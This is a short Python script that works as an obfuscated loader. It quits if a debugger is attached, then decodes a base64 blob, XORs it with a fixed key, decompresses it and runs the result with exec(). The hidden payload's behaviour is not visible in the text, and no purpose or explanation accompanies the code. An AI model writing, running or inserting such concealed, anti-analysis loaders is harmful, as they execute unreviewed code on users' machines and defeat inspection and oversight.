# -*- coding: utf-8 -*-
import base64, zlib, sys
if sys.gettrace() is not None: sys.exit(1)
def _load(d, k): return bytes(b ^ k for b in d)
exec(zlib.decompress(_load(base64.b64decode(b'JIbJCJcyh2xM4K93VML4ns0nUsxeGs6eXcAGFChvXt7KClFPxUgUljWnqQHOJmkq3Ahbn8gqOjs7Gz7QuYZk7TPc1uoxOHXAiDY1nLaSyBwHvcL1Y2nBI8xtmhQxqN0uAivyb5xlydtKZfQMFudc69ioq+hBooWDal5hP3+rX3abf3343sauxV4CFc/4qL4HdOR4SHMhWD84WahWJW8MGzUMjRMsVXeK4IQyayDh4eM5NfTKqVTULCNFHJF2LHqfj2jfA/EMCTtdBzo9hH94f1dqTJLFWHsEDNpvoF2ZSqjnNHD4u/XtSBX9sN7vb5LwSVrIf7NdtPowjJdv+djwrsCDgGG8hPtSTWO6WzqA8NbJW+4CuSwa/owoyGJNsBKdE/2wH8/8pcAZwzRCiTPqi/dR0rBdlD3N6mt8ESd1Pyvm+PBsfHBaLYF1W/qM5j10lp4Vh8L5U4fMLLKvxCAd78HhqIGC2VJfo0xLebTiDwlfie5pplkWay4M9XY0XSNIGuL6skU0hUXjYgbiCb351UczLCkbRGDUAb8IecZ3d72cvo+B7K651NU31Fagtu22A4ulobEB4iYgGJMiNFk/IHuUyIn1BdrVHr0VjG/J+u+SzfWKOt69nG/S1UuH0ettbI5mx5ACzQW2m24usvqBISG2q9gbrWNnJm+uuC8qvRWe2zsAmczXsKy2g/+k8oX3nijs/B1li/O9xJJJ0uxLcQlng70DavPw3g=='), 92)), globals())
